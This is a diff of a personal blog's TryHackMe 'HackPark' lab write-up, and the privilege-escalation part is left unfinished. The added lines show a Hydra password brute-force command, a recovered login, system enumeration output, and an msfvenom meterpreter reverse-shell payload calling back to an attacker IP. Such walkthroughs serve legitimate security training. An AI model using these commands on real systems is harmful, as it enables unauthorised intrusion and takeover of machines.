@@ -39,7 +39,8 @@
     <h1>0xskar@home:~$</h1>
     </a>
     <div class="header-links">
-      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+      <a href="/resources"><h2 class="header-link">Resources</h2></a>
+<a href="/archive"><h2 class="header-link">Archive</h2></a>
 <a href="/about"><h2 class="header-link">About</h2></a>
 <a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
     </div>
@@ -53,8 +54,6 @@
   <p><a href="https://tryhackme.com/room/hackpark">https://tryhackme.com/room/hackpark</a></p>
 
 <p>Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!</p>
-
-<p><img src="/assets/hackpark02.png" alt="" /></p>
 
 <hr />
 
@@ -120,6 +119,10 @@
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -t 16 -l admin -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.85.208 http-post-form "/Account/login.aspx:__VIEWSTATE=DwoboO4H6Lg0TVWgRpjNYIfKsqKTMsi6KZ%2FrLpvJsIRyXNLRSf3AR8CTQMQTYcdrLBGAP%2FYDhPf8rKSl4hOkXldcWG7BXJ9ELa5Rq8rH0osikXzZMXuVA17TmDJ6KPlI3BFrN31Tw8troT51IiMPW9VhjPvhT96NGMusiERE9NDv1Hnfqv19MQnu2jmwQCefYRSh1T5mSmXl%2FDzykSgz6WRGKNFo8666FszWs1GgT%2FRDfl8PEOgpJIlYI5WQ3BpiM76RCqXETcYlPzjFDuHgR0OWP1QrrPCM8vf6YJozaosZ%2BWjlbQiCbqxkcXixtvfHE0kfoVNVr66Z%2FtNXfRDr67%2Fzz77%2FM6ywjkRiBN1%2Fdg5x7WeK&amp;__EVENTVALIDATION=O%2FQ9GaTABmLsQKQUlAi8Z0FcLkfY6na0%2Fx4VNKOEmfdxE89nHewkLLaJzx96uT1fyeQFoIQYNtTiYaByuOlt682ZQ9ukMSDtwo7Mi9HYOdgj2zrPzayN2T9TYjl%2F8nWx2K1JetpiiOI1e0vO2FhO9OTKLgeOocGzPM1WciR5gWrO34MZ&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
 </code></pre></div></div>
 
+<ul>
+  <li>bingo! admin:1qaz2wsx</li>
+</ul>
+
 <p><img src="/assets/hackpark01.png" alt="" /></p>
 
 <hr />
@@ -175,7 +178,147 @@
   <li><code class="language-plaintext highlighter-rouge">systeminfo</code> to find system type for msfvenom</li>
 </ul>
 
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systeminfo 
+c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;systeminfo
+Host Name:                 HACKPARK
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00252-70000-00000-AA886
+Original Install Date:     8/3/2019, 10:43:23 AM
+System Boot Time:          6/21/2022, 10:52:00 PM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor<span class="o">(</span>s<span class="o">)</span>:              1 Processor<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.2.amazon, 8/24/2006
+Windows Directory:         C:<span class="se">\W</span>indows
+System Directory:          C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32
+Boot Device:               <span class="se">\D</span>evice<span class="se">\H</span>arddiskVolume1
+System Locale:             en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
+Input Locale:              en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
+Time Zone:                 <span class="o">(</span>UTC-08:00<span class="o">)</span> Pacific Time <span class="o">(</span>US &amp; Canada<span class="o">)</span>
+Total Physical Memory:     4,096 MB
+Available Physical Memory: 3,213 MB
+Virtual Memory: Max Size:  5,504 MB
+Virtual Memory: Available: 4,500 MB
+Virtual Memory: In Use:    1,004 MB
+Page File Location<span class="o">(</span>s<span class="o">)</span>:     C:<span class="se">\p</span>agefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix<span class="o">(</span>s<span class="o">)</span>:                 8 Hotfix<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: KB2919355
+                           <span class="o">[</span>02]: KB2919442
+                           <span class="o">[</span>03]: KB2937220
+                           <span class="o">[</span>04]: KB2938772
+                           <span class="o">[</span>05]: KB2939471
+                           <span class="o">[</span>06]: KB2949621
+                           <span class="o">[</span>07]: KB3035131
+                           <span class="o">[</span>08]: KB3060716
+Network Card<span class="o">(</span>s<span class="o">)</span>:           1 NIC<span class="o">(</span>s<span class="o">)</span> Installed.
+                           <span class="o">[</span>01]: AWS PV Network Device
+                                 Connection Name: Ethernet 2
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.0.1
+                                 IP address<span class="o">(</span>es<span class="o">)</span>
+                                 <span class="o">[</span>01]: 10.10.135.243
+                                 <span class="o">[</span>02]: fe80::481a:c2a2:753c:891e
+Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="k">for </span>Hyper-V will not be displayed.
+
+</code></pre></div></div>
+
+<ul>
+  <li>Create a reverse shell <code class="language-plaintext highlighter-rouge">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.127.225 LPORT=7777 -f exe &gt; thm/rooms/hackpark/reverse.exe</code> and upload.</li>
+  <li>Find the webserver directory <code class="language-plaintext highlighter-rouge">dir App_Data /AD /s</code></li>
+  <li>start msfconsole with <code class="language-plaintext highlighter-rouge">multi/handler</code> and payload <code class="language-plaintext highlighter-rouge">windows/meterpreter/reverse_tcp</code></li>
+  <li>start the uploaded shell on the target pc</li>
+</ul>
+
 <h5 id="answer-the-questions-below-3"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p>You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then <strong>feed this information into the windows-exploit-suggester script</strong> and quickly identify any obvious vulnerabilities.</p>
+
+<p><strong>What is the OS version of this windows machine?</strong></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> sysinfo
+Computer        : HACKPARK
+OS              : Windows 2012 R2 <span class="o">(</span>6.3 Build 9600<span class="o">)</span><span class="nb">.</span>
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+</code></pre></div></div>
+
+<ul>
+  <li>Windows 2012 R2 (6.3 Build 9600)</li>
+</ul>
+
+<p><strong>Further enumerate the machine.</strong></p>
+
+<ul>
+  <li>in target machine: <code class="language-plaintext highlighter-rouge">sysinfo</code> copy to sysinfo.txt</li>
+  <li>on kali input <code class="language-plaintext highlighter-rouge">wes sysinfo.txt &gt; system_vulns.txt</code></li>
+  <li><code class="language-plaintext highlighter-rouge">subl system_vulns.txt</code></li>
+</ul>
+
+<p><strong>What is the name of the abnormal service running?</strong></p>
+
+<ul>
+  <li>list services running <code class="language-plaintext highlighter-rouge">net start</code></li>
+  <li><code class="language-plaintext highlighter-rouge">sc queryex type= service state= all</code> - more information</li>
+  <li><code class="language-plaintext highlighter-rouge">tasklist /svc</code></li>
+  <li>Windows Scheduler (WService.exe)</li>
+</ul>
+
+<p><strong>What is the name of the binary you’re supposed to exploit?</strong></p>
+
+<ul>
+  <li>We need to find the logs of Windows Scheduler</li>
+</ul>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">dir \WService.exe /s</code> from root directory to find where we going</li>
+</ol>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\&gt;</span><span class="nb">dir</span> <span class="se">\W</span>Service.exe /s
+<span class="nb">dir</span> <span class="se">\W</span>Service.exe /s
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ Directory of c:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\S</span>ystemScheduler
+
+03/25/2018  10:58 AM            98,720 WService.exe
+               1 File<span class="o">(</span>s<span class="o">)</span>         98,720 bytes
+
+     Total Files Listed:
+               1 File<span class="o">(</span>s<span class="o">)</span>         98,720 bytes
+               0 Dir<span class="o">(</span>s<span class="o">)</span>  39,125,811,200 bytes free
+</code></pre></div></div>
+
+<ol>
+  <li>LogsFile.txt and LogFileAdvanced.txt show us nothing, but <code class="language-plaintext highlighter-rouge">type 20198415519.INI_LOG.txt</code> we see</li>
+</ol>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>06/22/22 01:02:33,Process Ended. PID:996,ExitCode:4,Message.exe <span class="o">(</span>Administrator<span class="o">)</span>
+06/22/22 01:03:01,Event Started Ok, <span class="o">(</span>Administrator<span class="o">)</span>
+</code></pre></div></div>
+
+<p><strong>Using this abnormal service, escalate your privileges!</strong></p>
+
+<ol>
+  <li>replace lets replace message.</li>
+  <li></li>
+</ol>
+
+<p><strong>What is the user flag (on Jeffs Desktop)?</strong></p>
+
+<p><strong>What is the root flag?</strong></p>
 
 <hr />
 
